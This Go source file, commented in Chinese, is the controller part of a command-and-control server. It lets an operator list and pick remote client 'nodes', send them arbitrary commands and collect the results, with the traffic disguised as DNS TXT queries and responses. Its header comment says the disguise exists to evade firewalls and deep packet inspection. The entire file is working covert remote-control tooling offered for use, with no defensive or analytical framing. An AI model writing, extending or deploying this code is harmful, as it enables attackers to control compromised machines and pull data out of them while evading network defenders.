/*
DNS伪装通信架构说明：

1. 控制端 <--TCP--> C2服务器 <--DNS伪装--> 客户端

通信层次：
- 控制端到C2服务器：使用原始TCP通信，方便管理和控制
- C2服务器到客户端：使用DNS伪装技术，绕过网络检测

DNS伪装原理：
- 将命令和数据封装在DNS查询/响应包中
- 使用TXT记录传输Base64编码的数据
- 伪装成正常的DNS流量，规避防火墙和DPI检测
- 支持双向通信：查询包传输命令，响应包传输结果

DNS包结构：
- Header: 标准DNS头部（12字节）
- Question: 包含编码命令的域名查询
- Answer: 包含编码响应的TXT记录（仅响应包）

编码方式：
- 使用自定义Base64编码避免DNS域名特殊字符
- 命令域名格式: [base64_command].cmd.example.com
- 响应域名格式: resp.example.com (数据在TXT记录中)
*/

package server

import (
	"bufio"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"
	"unicode/utf8"
)

// Controller 表示与控制端的通信会话
type Controller struct {
	conn            net.Conn
	server          *Server
	reader          *bufio.Reader
	activeClient    *Client    // 活动的TCP客户端
	activeDNSClient *DNSClient // 活动的DNS客户端
}

// NewController 创建新的控制端通信会话
func NewController(conn net.Conn, server *Server) *Controller {
	return &Controller{
		conn:   conn,
		server: server,
		reader: bufio.NewReader(conn),
	}
}

// handleCommands 处理来自控制端的命令，控制端使用原始TCP通信
func (c *Controller) handleCommands() {
	defer c.conn.Close()

	// 发送欢迎消息，说明与客户端的通信将使用DNS伪装
	c.sendMessage("C2服务器已连接，与客户端的通信将使用DNS伪装技术")

	for {
		// 发送普通TCP格式的命令提示符
		c.sendMessage("> ")

		// 读取普通TCP命令数据
		cmdStr, err := c.reader.ReadString('\n')
		if err != nil {
			fmt.Println("读取控制端命令失败:", err)
			break
		}

		cmdStr = strings.TrimSpace(cmdStr)
		if cmdStr == "" {
			continue
		}

		// 处理命令
		if cmdStr == "exit" {
			c.sendMessage("断开连接")
			break
		} else if cmdStr == "list nodes" {
			c.handleListNodes()
		} else if strings.HasPrefix(cmdStr, "choose ") {
			c.handleChooseNode(cmdStr)
		} else if c.activeClient != nil {
			// 如果已选择TCP客户端，将命令通过DNS伪装转发给它
			c.handleClientCommandWithDNS(cmdStr)
		} else if c.activeDNSClient != nil {
			// 如果已选择DNS客户端，将命令通过真实DNS隧道转发给它
			c.handleDNSClientCommand(cmdStr)
		} else {
			c.sendMessage("未知命令或未选择客户端。请先使用 'choose <类型-id>' 选择客户端。")
			c.sendMessage("使用 'list nodes' 查看可用客户端")
		}
	}
}

// handleListNodes 处理list nodes命令，列出TCP和DNS客户端
func (c *Controller) handleListNodes() {
	fmt.Printf("[控制端] 处理list nodes命令...\n")

	// 获取TCP客户端
	tcpClients := c.server.ListClients()
	fmt.Printf("[控制端] TCP客户端数量: %d\n", len(tcpClients))

	// 获取DNS客户端
	var dnsClients []*DNSClient
	if c.server.dnsServer != nil {
		fmt.Printf("[控制端] DNS服务器已设置，开始获取DNS客户端列表...\n")
		dnsClients = c.server.dnsServer.ListClients()
		fmt.Printf("[控制端] DNS服务器返回的客户端数量: %d\n", len(dnsClients))
	} else {
		fmt.Printf("[控制端] ❌ DNS服务器未设置！\n")
	}

	// 构建响应消息
	message := "已连接的客户端:\n"
	message += "=== TCP客户端 (旧版本) ===\n"
	if len(tcpClients) == 0 {
		message += "  无TCP客户端\n"
	} else {
		for _, client := range tcpClients {
			message += fmt.Sprintf("  TCP-%s\n", client.GetInfo())
		}
	}

	message += "=== DNS隧道客户端 (新版本) ===\n"
	if len(dnsClients) == 0 {
		message += "  无DNS客户端 (30秒内无心跳)\n"
		fmt.Printf("[控制端] DNS客户端列表为空 - 可能原因：\n")
		fmt.Printf("  1. 没有客户端连接\n")
		fmt.Printf("  2. 客户端超过30秒未发送心跳\n")
		fmt.Printf("  3. DNS服务器未正确处理心跳\n")
	} else {
		fmt.Printf("[控制端] 发现 %d 个活跃DNS客户端\n", len(dnsClients))
		for i, client := range dnsClients {
			lastSeen := time.Since(client.LastSeen)
			message += fmt.Sprintf("  DNS-%s (最后活动: %v前)\n", client.ID, lastSeen.Round(time.Second))
			fmt.Printf("[控制端] DNS客户端 %d: %s, 最后活动: %v前\n",
				i+1, client.ID, lastSeen.Round(time.Second))
		}
	}

	// 发送响应
	c.sendMessage(message)

	// 如果没有任何客户端，提供额外的诊断信息
	if len(tcpClients) == 0 && len(dnsClients) == 0 {
		diagMessage := "\n诊断信息:\n"
		diagMessage += "- 确保客户端正在运行并发送心跳\n"
		diagMessage += "- 检查DNS服务器是否在正确端口监听\n"
		diagMessage += "- 客户端需在30秒内发送心跳才会显示\n"
		c.sendMessage(diagMessage)
		fmt.Printf("[控制端] 发送诊断信息\n")
	}

	fmt.Printf("[控制端] list nodes 命令处理完成\n")
}

// handleChooseNode 处理choose命令，支持选择TCP或DNS客户端
func (c *Controller) handleChooseNode(cmdStr string) {
	parts := strings.Split(cmdStr, " ")
	if len(parts) != 2 {
		c.sendMessage("无效的命令格式。使用方法: choose <类型-id>")
		c.sendMessage("示例: choose TCP-1 或 choose DNS-192.168.1.100")
		return
	}

	target := parts[1]

	// 解析客户端类型和ID
	if strings.HasPrefix(target, "TCP-") {
		// 选择TCP客户端
		idStr := strings.TrimPrefix(target, "TCP-")
		id, err := strconv.Atoi(idStr)
		if err != nil {
			c.sendMessage("无效的TCP客户端ID")
			return
		}

		client := c.server.GetClient(id)
		if client == nil {
			c.sendMessage(fmt.Sprintf("未找到ID为 %d 的TCP客户端", id))
			return
		}

		c.activeClient = client
		c.activeDNSClient = nil
		c.sendMessage(fmt.Sprintf("已选择TCP客户端 #%d", id))

	} else if strings.HasPrefix(target, "DNS-") {
		// 选择DNS客户端
		clientID := strings.TrimPrefix(target, "DNS-")

		var dnsClient *DNSClient
		if c.server.dnsServer != nil {
			dnsClient = c.server.dnsServer.GetClient(clientID)
		}

		if dnsClient == nil {
			c.sendMessage(fmt.Sprintf("未找到ID为 %s 的DNS客户端", clientID))
			return
		}

		c.activeDNSClient = dnsClient
		c.activeClient = nil
		c.sendMessage(fmt.Sprintf("已选择DNS客户端 %s", clientID))

	} else {
		c.sendMessage("无效的客户端类型。请使用 TCP-<id> 或 DNS-<ip> 格式")
		c.sendMessage("使用 'list nodes' 查看可用客户端")
	}
}

// handleClientCommandWithDNS 处理发送到客户端的命令，使用DNS伪装与客户端通信
func (c *Controller) handleClientCommandWithDNS(cmdStr string) {
	// 注意：这里调用client.SendCommand时，客户端会使用DNS伪装接收和响应
	result, err := c.activeClient.SendCommand(cmdStr)
	if err != nil {
		c.sendMessage(fmt.Sprintf("命令执行失败: %v", err))
		// 如果客户端断开连接，重置当前活动客户端
		if strings.Contains(err.Error(), "断开连接") {
			c.server.RemoveClient(c.activeClient.ID)
			c.activeClient = nil
		}
		return
	}

	// 详细调试客户端返回的数据
	fmt.Printf("[服务器调试] 收到客户端原始结果，长度: %d 字符\n", len(result))
	fmt.Printf("[服务器调试] 结果内容（原始字节）: %v\n", []byte(result))

	// 检查每个字符的有效性
	invalidCount := 0
	for i, r := range result {
		if r == utf8.RuneError {
			if i < 10 { // 只显示前10个无效字符位置
				fmt.Printf("[服务器调试] 无效UTF-8字符位置: %d, 字节值: %02x\n", i, result[i])
			}
			invalidCount++
		}
	}

	fmt.Printf("[服务器调试] 总无效字符数: %d\n", invalidCount)

	// 使用更宽松的处理方式，尝试修复而不是拒绝数据
	if invalidCount > 0 {
		fmt.Printf("[服务器调试] 发现无效UTF-8字符，尝试修复...\n")
		// 使用ToValidUTF8替换无效字符
		result = strings.ToValidUTF8(result, "?")
		fmt.Printf("[服务器调试] 修复后结果长度: %d 字符\n", len(result))
	}

	responseMessage := fmt.Sprintf("客户端 #%d 返回结果:\n%s", c.activeClient.ID, result)
	c.sendMessage(responseMessage)
}

// readDNSMessage 从连接中读取DNS伪装的消息
func (c *Controller) readDNSMessage() (string, error) {
	// 读取DNS消息长度（前2字节）
	lengthBytes := make([]byte, 2)
	_, err := c.conn.Read(lengthBytes)
	if err != nil {
		return "", fmt.Errorf("读取DNS消息长度失败: %w", err)
	}

	messageLength := binary.BigEndian.Uint16(lengthBytes)
	if messageLength == 0 {
		return "", fmt.Errorf("无效的DNS消息长度")
	}

	// 读取完整的DNS消息
	dnsData := make([]byte, messageLength)
	_, err = c.conn.Read(dnsData)
	if err != nil {
		return "", fmt.Errorf("读取DNS消息数据失败: %w", err)
	}

	// 解析DNS查询，提取实际命令
	command, _, err := c.parseDNSQuery(dnsData)
	if err != nil {
		return "", fmt.Errorf("解析DNS查询失败: %w", err)
	}

	return command, nil
}

// sendDNSMessage 向控制端发送DNS伪装的消息
func (c *Controller) sendDNSMessage(message string) {
	// 创建DNS响应消息
	queryID := generateDNSID()
	dnsResponse := c.createDNSResponse(queryID, message)

	// 发送消息长度（前2字节）
	lengthBytes := make([]byte, 2)
	binary.BigEndian.PutUint16(lengthBytes, uint16(len(dnsResponse)))

	_, err := c.conn.Write(lengthBytes)
	if err != nil {
		fmt.Println("发送DNS消息长度失败:", err)
		return
	}

	// 发送DNS响应数据
	_, err = c.conn.Write(dnsResponse)
	if err != nil {
		fmt.Println("发送DNS响应数据失败:", err)
		return
	}

	// 添加短暂延迟确保数据完整传输
	time.Sleep(5 * time.Millisecond)
}

// sendMessage 原始的消息发送方法，确保UTF-8编码正确
func (c *Controller) sendMessage(msg string) {
	// 确保消息是有效的UTF-8编码
	if !utf8.ValidString(msg) {
		fmt.Printf("[控制端] ⚠️  警告：尝试发送非UTF-8编码的消息，长度: %d\n", len(msg))
		// 清理无效的UTF-8字符
		msg = strings.ToValidUTF8(msg, "�")
	}

	// 确保消息以换行符结尾
	if !strings.HasSuffix(msg, "\n") {
		msg += "\n"
	}

	// 转换为UTF-8字节
	msgBytes := []byte(msg)

	// 打印发送的响应数据内容（限制长度以便阅读）
	msgPreview := strings.ReplaceAll(msg, "\n", "\\n")
	if len(msgPreview) > 100 {
		msgPreview = msgPreview[:100] + "..."
	}
	fmt.Printf("[控制端] 📤 发送响应: %s (总字节: %d)\n", msgPreview, len(msgBytes))

	// 分块发送大消息
	const chunkSize = 1024 // 1KB一块
	messageLength := len(msgBytes)

	for i := 0; i < messageLength; i += chunkSize {
		end := i + chunkSize
		if end > messageLength {
			end = messageLength
		}

		chunk := msgBytes[i:end]
		_, err := c.conn.Write(chunk)
		if err != nil {
			fmt.Printf("[控制端] ❌ 向控制端发送消息失败: %v\n", err)
			return
		}

		// 短暂延迟确保接收端能处理
		if messageLength > chunkSize {
			time.Sleep(5 * time.Millisecond)
		}
	}

	fmt.Printf("[控制端] ✅ 响应发送完成\n")
}

// generateDNSID 生成DNS消息ID
func generateDNSID() uint16 {
	var id [2]byte
	rand.Read(id[:])
	return binary.BigEndian.Uint16(id[:])
}

// encodeDNSHeader 编码DNS头部
func encodeDNSHeader(header *DNSHeader) []byte {
	buf := make([]byte, 12)
	binary.BigEndian.PutUint16(buf[0:2], header.ID)
	binary.BigEndian.PutUint16(buf[2:4], header.Flags)
	binary.BigEndian.PutUint16(buf[4:6], header.QDCount)
	binary.BigEndian.PutUint16(buf[6:8], header.ANCount)
	binary.BigEndian.PutUint16(buf[8:10], header.NSCount)
	binary.BigEndian.PutUint16(buf[10:12], header.ARCount)
	return buf
}

// decodeDNSHeader 解码DNS头部
func decodeDNSHeader(data []byte) (*DNSHeader, error) {
	if len(data) < 12 {
		return nil, fmt.Errorf("DNS头部数据不足")
	}

	header := &DNSHeader{
		ID:      binary.BigEndian.Uint16(data[0:2]),
		Flags:   binary.BigEndian.Uint16(data[2:4]),
		QDCount: binary.BigEndian.Uint16(data[4:6]),
		ANCount: binary.BigEndian.Uint16(data[6:8]),
		NSCount: binary.BigEndian.Uint16(data[8:10]),
		ARCount: binary.BigEndian.Uint16(data[10:12]),
	}
	return header, nil
}

// encodeDomainName 编码域名为DNS格式
// 例如: "cmd.example.com" -> [3]cmd[7]example[3]com[0]
func encodeDomainName(domain string) []byte {
	if domain == "" {
		return []byte{0}
	}

	parts := strings.Split(domain, ".")
	var result []byte

	for _, part := range parts {
		if len(part) > 63 {
			part = part[:63] // DNS标签最大63字符
		}
		result = append(result, byte(len(part)))
		result = append(result, []byte(part)...)
	}
	result = append(result, 0) // 域名结束标记
	return result
}

// decodeDomainName 解码DNS格式的域名
func decodeDomainName(data []byte, offset int) (string, int, error) {
	if offset >= len(data) {
		return "", offset, fmt.Errorf("域名数据偏移超界")
	}

	var parts []string
	originalOffset := offset

	for {
		if offset >= len(data) {
			return "", originalOffset, fmt.Errorf("域名数据不完整")
		}

		length := int(data[offset])
		offset++

		if length == 0 {
			break // 域名结束
		}

		if length > 63 {
			return "", originalOffset, fmt.Errorf("无效的域名标签长度")
		}

		if offset+length > len(data) {
			return "", originalOffset, fmt.Errorf("域名标签数据不完整")
		}

		part := string(data[offset : offset+length])
		parts = append(parts, part)
		offset += length
	}

	domain := strings.Join(parts, ".")
	return domain, offset, nil
}

// createDNSQuery 创建DNS查询消息，用于封装命令数据
func (c *Controller) createDNSQuery(command string) []byte {
	// 创建DNS头部
	header := &DNSHeader{
		ID:      generateDNSID(),
		Flags:   DNS_FLAG_RD, // 设置递归期望标志
		QDCount: 1,           // 一个查询
		ANCount: 0,
		NSCount: 0,
		ARCount: 0,
	}

	// 编码头部
	dnsPacket := encodeDNSHeader(header)

	// 创建查询域名，将命令编码到域名中
	// 使用标准库Base64编码命令以避免域名特殊字符问题，确保UTF-8中文正确处理
	commandEncoded := base64.URLEncoding.EncodeToString([]byte(command))
	fmt.Printf("[服务器调试] Base64编码命令 - 输入UTF-8字节: %d，输出长度: %d，命令: %s\n",
		len([]byte(command)), len(commandEncoded), command)
	queryDomain := fmt.Sprintf("%s.%s%s", commandEncoded, COMMAND_SUBDOMAIN, DNS_DOMAIN_SUFFIX)

	// 编码查询域名
	encodedDomain := encodeDomainName(queryDomain)
	dnsPacket = append(dnsPacket, encodedDomain...)

	// 添加查询类型和类别 (TXT记录, IN类)
	typeAndClass := make([]byte, 4)
	binary.BigEndian.PutUint16(typeAndClass[0:2], DNS_TYPE_TXT)
	binary.BigEndian.PutUint16(typeAndClass[2:4], DNS_CLASS_IN)
	dnsPacket = append(dnsPacket, typeAndClass...)

	return dnsPacket
}

// createDNSResponse 创建DNS响应消息，用于封装响应数据
func (c *Controller) createDNSResponse(queryID uint16, responseData string) []byte {
	// 创建DNS响应头部
	header := &DNSHeader{
		ID:      queryID,
		Flags:   DNS_FLAG_QR | DNS_FLAG_AA | DNS_FLAG_RD | DNS_FLAG_RA, // 响应标志
		QDCount: 1,                                                     // 原始查询
		ANCount: 1,                                                     // 一个回答
		NSCount: 0,
		ARCount: 0,
	}

	// 编码头部
	dnsPacket := encodeDNSHeader(header)

	// 重构原始查询部分
	queryDomain := fmt.Sprintf("%s%s", RESPONSE_SUBDOMAIN, DNS_DOMAIN_SUFFIX)
	encodedDomain := encodeDomainName(queryDomain)
	dnsPacket = append(dnsPacket, encodedDomain...)

	// 查询类型和类别
	typeAndClass := make([]byte, 4)
	binary.BigEndian.PutUint16(typeAndClass[0:2], DNS_TYPE_TXT)
	binary.BigEndian.PutUint16(typeAndClass[2:4], DNS_CLASS_IN)
	dnsPacket = append(dnsPacket, typeAndClass...)

	// 添加回答部分
	// 名称压缩指针指向查询部分的域名
	namePointer := []byte{0xc0, 0x0c} // 压缩指针指向偏移12的位置
	dnsPacket = append(dnsPacket, namePointer...)

	// 类型和类别
	dnsPacket = append(dnsPacket, typeAndClass...)

	// TTL (生存时间) - 设置为300秒
	ttl := make([]byte, 4)
	binary.BigEndian.PutUint32(ttl, 300)
	dnsPacket = append(dnsPacket, ttl...)

	// TXT记录数据
	encodedResponse := base64.URLEncoding.EncodeToString([]byte(responseData))
	fmt.Printf("[服务器调试] Base64编码响应 - 输入UTF-8字节: %d，输出长度: %d\n",
		len([]byte(responseData)), len(encodedResponse))
	if len(encodedResponse) > 255 {
		encodedResponse = encodedResponse[:255] // TXT记录最大255字符
	}

	// 数据长度
	dataLength := make([]byte, 2)
	binary.BigEndian.PutUint16(dataLength, uint16(len(encodedResponse)+1))
	dnsPacket = append(dnsPacket, dataLength...)

	// TXT记录数据 (长度前缀 + 数据)
	dnsPacket = append(dnsPacket, byte(len(encodedResponse)))
	dnsPacket = append(dnsPacket, []byte(encodedResponse)...)

	return dnsPacket
}

// parseDNSQuery 解析DNS查询消息，提取命令数据
func (c *Controller) parseDNSQuery(data []byte) (string, uint16, error) {
	// 解析DNS头部
	header, err := decodeDNSHeader(data)
	if err != nil {
		return "", 0, fmt.Errorf("解析DNS头部失败: %w", err)
	}

	if header.QDCount == 0 {
		return "", header.ID, fmt.Errorf("DNS查询没有问题部分")
	}

	// 解析查询域名
	domain, _, err := decodeDomainName(data, 12)
	if err != nil {
		return "", header.ID, fmt.Errorf("解析域名失败: %w", err)
	}

	// 从域名中提取命令
	if !strings.Contains(domain, COMMAND_SUBDOMAIN) {
		return "", header.ID, fmt.Errorf("不是命令查询域名")
	}

	// 提取编码的命令部分
	parts := strings.Split(domain, ".")
	if len(parts) < 2 {
		return "", header.ID, fmt.Errorf("域名格式不正确")
	}

	encodedCommand := parts[0]
	// 使用标准库Base64解码，确保UTF-8中文字符正确处理
	decodedBytes, err := base64.URLEncoding.DecodeString(encodedCommand)
	if err != nil {
		return "", header.ID, fmt.Errorf("解码命令失败: %w", err)
	}
	command := string(decodedBytes)
	fmt.Printf("[服务器调试] Base64解码命令 - 输入长度: %d，输出UTF-8字节: %d，命令: %s\n",
		len(encodedCommand), len(decodedBytes), command)

	return command, header.ID, nil
}

// ==============================================
// DNS伪装专用函数 - 仅用于与客户端通信
// ==============================================

// sendDNSCommandToClient 向客户端发送DNS伪装的命令
// 这个函数会被Client结构体调用，用于将控制端的命令通过DNS伪装发送给客户端
func (c *Controller) sendDNSCommandToClient(clientConn net.Conn, command string) error {
	// 创建DNS查询消息，将命令伪装成DNS查询
	dnsQuery := c.createDNSQuery(command)

	fmt.Printf("[调试] 创建DNS查询，命令: %s，长度: %d 字节\n", command, len(dnsQuery))

	// 设置写入超时
	clientConn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	defer clientConn.SetWriteDeadline(time.Time{})

	// 发送消息长度（前2字节，模拟TCP over DNS）
	lengthBytes := make([]byte, 2)
	binary.BigEndian.PutUint16(lengthBytes, uint16(len(dnsQuery)))

	_, err := clientConn.Write(lengthBytes)
	if err != nil {
		return fmt.Errorf("发送DNS查询长度失败: %w", err)
	}

	// 发送DNS查询数据
	totalWritten := 0
	for totalWritten < len(dnsQuery) {
		n, err := clientConn.Write(dnsQuery[totalWritten:])
		if err != nil {
			return fmt.Errorf("发送DNS查询数据失败(已发送%d/%d字节): %w", totalWritten, len(dnsQuery), err)
		}
		totalWritten += n
	}

	fmt.Printf("[调试] 成功发送DNS查询: %d 字节\n", totalWritten)

	return nil
}

// readDNSResponseFromClient 从客户端读取DNS伪装的响应
// 这个函数会被Client结构体调用，用于接收客户端通过DNS伪装发送的命令执行结果
func (c *Controller) readDNSResponseFromClient(clientConn net.Conn) (string, error) {
	// 设置读取超时，避免无限等待
	clientConn.SetReadDeadline(time.Now().Add(30 * time.Second))
	defer clientConn.SetReadDeadline(time.Time{})

	// 读取DNS消息长度（前2字节）
	lengthBytes := make([]byte, 2)
	n, err := clientConn.Read(lengthBytes)
	if err != nil {
		return "", fmt.Errorf("读取DNS响应长度失败: %w", err)
	}
	if n != 2 {
		return "", fmt.Errorf("DNS响应长度字节不完整，期望2字节，实际%d字节", n)
	}

	messageLength := binary.BigEndian.Uint16(lengthBytes)
	if messageLength == 0 {
		return "", fmt.Errorf("无效的DNS响应长度: %d", messageLength)
	}

	fmt.Printf("[调试] 接收DNS响应长度: %d 字节\n", messageLength)

	// 读取完整的DNS响应
	dnsData := make([]byte, messageLength)
	totalRead := 0
	for totalRead < int(messageLength) {
		n, err := clientConn.Read(dnsData[totalRead:])
		if err != nil {
			return "", fmt.Errorf("读取DNS响应数据失败(已读取%d/%d字节): %w", totalRead, messageLength, err)
		}
		totalRead += n
	}

	fmt.Printf("[调试] 成功读取DNS响应: %d 字节\n", totalRead)

	// 解析DNS响应，提取实际结果
	result, err := c.parseDNSResponse(dnsData)
	if err != nil {
		return "", fmt.Errorf("解析DNS响应失败: %w", err)
	}

	return result, nil
}

// parseDNSResponse 解析DNS响应消息，提取响应数据
func (c *Controller) parseDNSResponse(data []byte) (string, error) {
	// 解析DNS头部
	header, err := decodeDNSHeader(data)
	if err != nil {
		return "", fmt.Errorf("解析DNS响应头部失败: %w", err)
	}

	if header.ANCount == 0 {
		return "", fmt.Errorf("DNS响应没有回答部分")
	}

	// 跳过查询部分，找到回答部分
	offset := 12 // DNS头部长度

	// 跳过查询域名
	_, newOffset, err := decodeDomainName(data, offset)
	if err != nil {
		return "", fmt.Errorf("跳过查询域名失败: %w", err)
	}
	offset = newOffset + 4 // 跳过类型和类别

	// 解析回答部分
	// 跳过名称（可能是压缩指针）
	if offset+2 > len(data) {
		return "", fmt.Errorf("回答部分数据不足")
	}

	if data[offset]&0xC0 == 0xC0 {
		// 压缩指针，跳过2字节
		offset += 2
	} else {
		// 普通域名，需要解析
		_, newOffset, err := decodeDomainName(data, offset)
		if err != nil {
			return "", fmt.Errorf("解析回答域名失败: %w", err)
		}
		offset = newOffset
	}

	// 跳过类型、类别、TTL
	offset += 8

	// 读取数据长度
	if offset+2 > len(data) {
		return "", fmt.Errorf("数据长度字段不足")
	}
	dataLength := binary.BigEndian.Uint16(data[offset : offset+2])
	offset += 2

	// 读取TXT记录数据，支持分块数据
	if offset+int(dataLength) > len(data) {
		return "", fmt.Errorf("TXT记录数据不足")
	}

	var encodedData strings.Builder
	remainingLength := int(dataLength)

	// 读取所有TXT记录分块
	for remainingLength > 0 {
		if offset >= len(data) {
			return "", fmt.Errorf("TXT记录数据不完整")
		}

		// 读取当前分块长度
		txtLength := int(data[offset])
		offset++
		remainingLength--

		if txtLength > remainingLength {
			return "", fmt.Errorf("TXT记录长度不正确: %d > %d", txtLength, remainingLength)
		}

		if offset+txtLength > len(data) {
			return "", fmt.Errorf("TXT记录实际数据不足")
		}

		// 读取当前分块数据
		chunkData := string(data[offset : offset+txtLength])
		encodedData.WriteString(chunkData)

		offset += txtLength
		remainingLength -= txtLength

		fmt.Printf("[调试] 读取TXT分块，长度: %d，累计长度: %d\n", txtLength, encodedData.Len())
	}

	fmt.Printf("[调试] 总编码数据长度: %d\n", encodedData.Len())

	// 使用标准库Base64解码，确保UTF-8中文字符正确处理
	decodedBytes, err := base64.URLEncoding.DecodeString(encodedData.String())
	if err != nil {
		return "", fmt.Errorf("解码响应数据失败: %w", err)
	}
	result := string(decodedBytes)
	fmt.Printf("[调试] Base64解码响应 - 输入长度: %d，输出UTF-8字节: %d，结果长度: %d 字符\n",
		encodedData.Len(), len(decodedBytes), len(result))
	return result, nil
}

// isValidUTF8 检查字符串是否为有效的UTF-8编码
func isValidUTF8(s string) bool {
	return utf8.ValidString(s)
}

// handleDNSClientCommand 处理发送到DNS客户端的命令
func (c *Controller) handleDNSClientCommand(cmdStr string) {
	if c.server.dnsServer == nil {
		c.sendMessage("DNS服务器不可用")
		return
	}

	fmt.Printf("[控制端] 向DNS客户端 %s 发送命令: %s\n", c.activeDNSClient.ID, cmdStr)

	// 通过DNS服务器发送命令
	err := c.server.dnsServer.SendCommandToClient(c.activeDNSClient.ID, cmdStr)
	if err != nil {
		c.sendMessage(fmt.Sprintf("发送命令失败: %v", err))
		return
	}

	c.sendMessage(fmt.Sprintf("命令已发送到DNS客户端 %s，等待执行结果...", c.activeDNSClient.ID))

	// 等待执行结果 - 这里需要实现一个结果等待机制
	// 由于DNS客户端的结果是异步返回的，我们需要设置一个等待机制
	result, err := c.waitForDNSResult(c.activeDNSClient.ID, 60*time.Second)
	if err != nil {
		c.sendMessage(fmt.Sprintf("等待执行结果失败: %v", err))
		// 检查客户端是否仍然连接
		if time.Since(c.activeDNSClient.LastSeen) > 30*time.Second {
			c.sendMessage("DNS客户端可能已断开连接，将取消选择")
			c.activeDNSClient = nil
		}
		return
	}

	// 发送结果给控制端
	c.sendMessage(fmt.Sprintf("执行结果:\n%s", result))
}

// waitForDNSResult 等待DNS客户端的执行结果
func (c *Controller) waitForDNSResult(clientID string, timeout time.Duration) (string, error) {
	// 这里需要实现一个等待机制来获取DNS客户端的执行结果
	// 由于DNS客户端的结果是通过DNS查询异步返回的，我们需要一个通知机制

	// 简化实现：创建一个结果通道，等待DNS服务器通知结果
	resultChan := make(chan string, 1)
	timeoutChan := time.After(timeout)

	// 注册结果等待（这里需要在DNS服务器中实现相应的通知机制）
	c.registerResultWaiter(clientID, resultChan)

	select {
	case result := <-resultChan:
		return result, nil
	case <-timeoutChan:
		c.unregisterResultWaiter(clientID)
		return "", fmt.Errorf("等待执行结果超时")
	}
}

// resultWaiters 存储等待结果的通道
var resultWaiters = make(map[string]chan string)
var resultWaitersMu sync.Mutex

// registerResultWaiter 注册结果等待通道
func (c *Controller) registerResultWaiter(clientID string, resultChan chan string) {
	resultWaitersMu.Lock()
	defer resultWaitersMu.Unlock()
	resultWaiters[clientID] = resultChan
}

// unregisterResultWaiter 取消注册结果等待通道
func (c *Controller) unregisterResultWaiter(clientID string) {
	resultWaitersMu.Lock()
	defer resultWaitersMu.Unlock()
	delete(resultWaiters, clientID)
}

// NotifyResult 通知控制端执行结果（由DNS服务器调用）
func NotifyResult(clientID, result string) {
	resultWaitersMu.Lock()
	defer resultWaitersMu.Unlock()

	if resultChan, exists := resultWaiters[clientID]; exists {
		select {
		case resultChan <- result:
			fmt.Printf("[控制端] 已通知客户端 %s 的执行结果\n", clientID)
		default:
			fmt.Printf("[控制端] 结果通道已满，客户端: %s\n", clientID)
		}
		delete(resultWaiters, clientID)
	}
}
